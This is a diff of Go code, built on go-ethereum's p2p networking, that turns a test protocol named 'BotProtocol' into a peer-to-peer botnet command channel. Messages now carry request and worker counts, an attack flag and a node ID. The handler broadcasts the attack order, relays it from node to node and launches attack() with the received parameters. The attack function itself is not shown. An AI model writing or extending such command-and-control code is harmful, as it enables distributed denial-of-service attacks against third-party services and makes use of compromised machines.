@@ -7,14 +7,15 @@ import (
 	"github.com/ethereum/go-ethereum/p2p/discover"
 	"strconv"
 	"strings"
-	"time"
 )
 
 const messageId = 0
 
 type Message struct {
-	NReq uint64
-	Desc string
+	NReq     uint64
+	NWorkers uint64
+	Attack   uint64
+	NodeId   string
 }
 
 func BotProtocol() p2p.Protocol {
@@ -52,11 +53,10 @@ func startServer() *p2p.Server {
 }
 
 func msgHandler(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
+	if *Attack == 1 {
+		p2p.SendItems(rw, messageId, Message{uint64(*NReq), uint64(*NWorkers), uint64(*Attack), NodeId})
+	}
 	for {
-		select {
-		case <-time.After(1 * time.Second):
-			p2p.SendItems(rw, messageId, Message{uint64(1), "test"})
-		}
 		msg, err := rw.ReadMsg()
 		if err != nil {
 			return err
@@ -68,11 +68,15 @@ func msgHandler(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
 			continue
 		}
 
-		switch myMessage[0].NReq {
+		switch myMessage[0].Attack {
 		case 1:
-			err := p2p.SendItems(rw, messageId, Message{uint64(2), "test"})
-			if err != nil {
-				return err
+			if NodeId != myMessage[0].NodeId {
+				fmt.Println("Starting attack", myMessage)
+				err := p2p.SendItems(rw, messageId, Message{myMessage[0].NReq, myMessage[0].NWorkers, myMessage[0].Attack, myMessage[0].NodeId})
+				attack(int(myMessage[0].NReq), int(myMessage[0].NWorkers))
+				if err != nil {
+					return err
+				}
 			}
 		default:
 			fmt.Println("recv:", myMessage)
